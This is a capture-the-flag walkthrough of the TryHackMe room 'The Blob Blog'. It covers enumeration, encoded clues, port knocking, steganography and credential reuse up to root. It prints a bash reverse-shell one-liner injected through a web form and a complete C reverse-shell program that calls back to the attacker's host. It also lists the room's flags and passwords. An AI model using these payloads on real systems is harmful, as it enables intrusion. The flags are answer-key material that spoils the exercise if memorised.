# The Blob Blog

Successfully hack into bobloblaw's computer

[The Blob Blog](https://tryhackme.com/room/theblobblog)

## Topic's

- Network Enumeration
- Web Enumeration
- Cryptography
  - Base64
  - Brainfuck
  - Base58
  - Vigenère
- Port Knocking
- Stored Passwords & Keys
- FTP Enumeration
- Steganography
- Code Injection
- Rerverse Engineering

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Root The Box

Can you root the box?

```
kali@kali:~/CTFs/tryhackme/The Blob Blog$ sudo nmap -A -sS -sC -sV -O 10.10.241.38
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 20:38 CEST
Nmap scan report for 10.10.241.38
Host is up (0.038s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|storage-misc
Running (JUST GUESSING): Crestron 2-Series (87%), HP embedded (85%)
OS CPE: cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3
Aggressive OS guesses: Crestron XPanel control system (87%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   36.52 ms 10.8.0.1
2   37.22 ms 10.10.241.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.59 seconds
```

```
kali@kali:~/CTFs/tryhackme/The Blob Blog$ sudo /opt/dirsearch/dirsearch.py -u 10.10.241.38 -w /usr/share/wordlists/dirb/common.txt -e html,php
[sudo] password for kali:

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4613

Error Log: /opt/dirsearch/logs/errors-20-10-14_20-40-43.log

Target: 10.10.241.38

Output File: /opt/dirsearch/reports/10.10.241.38/_20-10-14_20-40-43.txt

[20:40:43] Starting:
[20:40:49] 200 -   13KB - /index.html
[20:40:53] 403 -  292B  - /server-status

Task Completed
```

[view-source:http://10.10.241.38/](view-source:http://10.10.241.38/)

```
<!--
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==
-->
```

`When I was a kid, my friends and I would always knock on 3 of our neighbors doors. Always houses 1, then 3, then 5!`

```html
<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->
```

`cUpC4k3s`

`for x in 1 3 5; do nc -w 1 -z 10.10.241.38 $x; done`

```
kali@kali:~/CTFs/tryhackme/The Blob Blog$ sudo nmap -A -sS -sC -sV -O 10.10.241.38
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 20:48 CEST
Nmap scan report for 10.10.241.38
Host is up (0.037s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp  open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.5.3)
|_http-server-header: Werkzeug/1.0.1 Python/3.5.3
|_http-title: Apache2 Ubuntu Default Page: It works
Aggressive OS guesses: Crestron XPanel control system (92%), ASUS RT-N56U WAP (Linux 3.4) (92%), Linux 3.16 (92%), Linux 3.10 - 3.13 (90%), Linux 4.10 (89%), Linux 3.1 (89%), Linux 3.2 (89%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (88%), Vodavi XTS-IP PBX (87%), Epson Stylus Pro 400 printer (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   36.37 ms 10.8.0.1
2   36.44 ms 10.10.241.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.13 seconds
```

[view-source:http://10.10.241.38:445/](view-source:http://10.10.241.38:445/)

```html
<!--
Bob, I swear to goodness, if you can't remember p@55w0rd 
It's not that hard
-->
```

```
kali@kali:~/CTFs/tryhackme/The Blob Blog$ gobuster dir -u http://10.10.241.38:445/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.241.38:445/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/14 20:52:14 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
/user (Status: 200)
===============================================================
2020/10/14 20:52:33 Finished
===============================================================
```

[view-source:http://10.10.241.38:445/user](view-source:http://10.10.241.38:445/user)

`bob:cUpC4k3s`

```
kali@kali:~/CTFs/tryhackme/The Blob Blog$ ftp 10.10.241.38
Connected to 10.10.241.38.
220 (vsFTPd 3.0.2)
Name (10.10.241.38:kali): bob
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001         8980 Jul 25 14:07 examples.desktop
dr-xr-xr-x    3 65534    65534        4096 Jul 25 14:08 ftp
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Jul 28 16:05 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001         8183 Jul 28 16:05 cool.jpeg
226 Directory send OK.
ftp> get cool.jpeg
local: cool.jpeg remote: cool.jpeg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cool.jpeg (8183 bytes).
226 Transfer complete.
8183 bytes received in 0.14 secs (57.7721 kB/s)
ftp>
```

```
kali@kali:~/CTFs/tryhackme/The Blob Blog$ steghide extract -sf cool.jpeg
Enter passphrase:
wrote extracted data to "out.txt".
kali@kali:~/CTFs/tryhackme/The Blob Blog$ cat out.txt
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
```

[http://10.10.241.38:445/bobs_safe_for_stuff](http://10.10.241.38:445/bobs_safe_for_stuff)

```
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
```

`bob:d1ff3r3ntP@55w0rd`

```
kali@kali:~/CTFs/tryhackme/The Blob Blog$ gobuster dir -u http://10.10.241.38:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.241.38:8080/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/14 21:00:45 Starting gobuster
===============================================================
/blog (Status: 302)
/login (Status: 200)
/review (Status: 302)
/blog1 (Status: 200)
/blog2 (Status: 200)
/blog3 (Status: 200)
Progress: 33913 / 220561 (15.38%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/14 21:05:59 Finished
===============================================================
```

[http://10.10.130.138:8080/blog](http://10.10.130.138:8080/blog)

`bob:d1ff3r3ntP@55w0rd`

`bash -i >& /dev/tcp/10.8.106.222/9001 0>&1`

[http://10.10.130.138:8080/review](http://10.10.130.138:8080/review)

```
www-data@bobloblaw-VirtualBox:~/html2$ /usr/bin/blogFeedback 6 5 4 3 2 1
/usr/bin/blogFeedback 6 5 4 3 2 1
whoami
bobloblaw
cd /home/bobloblaw
ls
Desktop
Documents
Downloads
examples.desktop
Music
Pictures
Public
Templates
Videos
cd Desktop
ls
dontlookatthis.jpg
lookatme.jpg
user.txt
cat user.txt
THM{C0NGR4t$_g3++ing_this_fur}

@jakeyee thank you so so so much for the help with the foothold on the box!!
```

ls -la
total 16
drwxr-xr-x 3 bobloblaw bobloblaw 4096 Jul 30 09:33 .
drwxrwx--- 16 bobloblaw bobloblaw 4096 Aug 6 14:51 ..
drwxrwx--- 2 bobloblaw bobloblaw 4096 Oct 25 11:06 .also_boring
-rw-rw---- 1 bobloblaw bobloblaw 92 Jul 30 09:33 .boring_file.c

```cpp
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main (int argc, char **argv)
{
  int scktd;
  struct sockaddr_in client;

  client.sin_family = AF_INET;
  client.sin_addr.s_addr = inet_addr("10.8.106.222");
  client.sin_port = htons(9002);

  scktd = socket(AF_INET,SOCK_STREAM,0);
  connect(scktd,(struct sockaddr *)&client,sizeof(client));

  dup2(scktd,0); // STDIN
  dup2(scktd,1); // STDOUT
  dup2(scktd,2); // STDERR

  execl("/bin/sh","sh","-i",NULL,NULL);

  return 0;
}
```

```
kali@kali:~/CTFs/tryhackme/The Blob Blog$ nc -lnvp 9002
Listening on 0.0.0.0 9002
Connection received on 10.10.130.138 56316
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{G00D_J0B_G3++1NG+H3R3!}
```

1. User Flag

`THM{C0NGR4t$_g3++ing_this_fur}`

2. Root Flag

`THM{G00D_J0B_G3++1NG+H3R3!}`
